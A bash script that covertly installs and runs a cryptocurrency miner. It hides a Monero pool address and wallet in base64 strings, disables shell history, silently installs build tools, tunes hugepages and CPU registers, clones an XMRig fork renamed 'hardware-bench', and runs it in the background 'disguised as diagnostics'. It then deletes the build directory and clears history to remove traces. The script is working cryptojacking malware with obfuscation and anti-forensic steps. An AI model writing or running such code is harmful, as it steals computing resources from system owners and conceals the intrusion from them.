#!/bin/bash

# Disable command history
set +o history

# Obfuscated Configuration
W=$(echo "NDgxR2VyZ24xZVZmOVliYWV6amI0d0V1ZnVNMWYya25SRXZ5ZEZWUGczbzU5V0dabWk0TDRxVVR2cnExaEJxeEdEMkJQejFvWFJUY29TMlMzR01Nc1hMZUxUSjNZVzI=" | base64 -d)
P=$(echo "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjg=" | base64 -d)
N="${1:-sys-default}"

# Dependency Setup (Shuffled Order)
DEPS=(
  "libhwloc-dev" 
  "libuv1-dev" 
  "cmake" 
  "git" 
  "build-essential" 
  "libssl-dev"
)
for pkg in "${DEPS[@]}"; do
  dpkg -l | grep -qw $pkg || sudo apt-get install -y $pkg > /dev/null 2>&1
done

# System Optimization
echo "[*] Tuning system parameters..."
sudo sysctl -w vm.nr_hugepages=$(( (RANDOM % 64) + 128 )) > /dev/null
echo "vm.nr_hugepages=$(( (RANDOM % 64) + 128 ))" | sudo tee -a /etc/sysctl.conf > /dev/null

# Hardware Prep
sudo modprobe msr 2>/dev/null
sudo wrmsr -a 0x1a4 0xf 2>/dev/null

# Clone (Your Renamed XMRig Fork)
git clone https://github.com/linux-utils/hardware-bench.git --depth 1 --quiet
cd hardware-bench

# Build with Random Delay
sleep $(( RANDOM % 10 + 5 ))
mkdir -p build && cd build
cmake .. > /dev/null 2>&1
make -j$(nproc) > /dev/null 2>&1

# Start (Disguised as Diagnostics)
./xmrig -o $P -u $W -p $N \
  --randomx-1gb-pages \
  --cpu-no-yield \
  --background > /dev/null 2>&1 &

# Clean Traces
cd ../..
rm -rf hardware-bench
history -c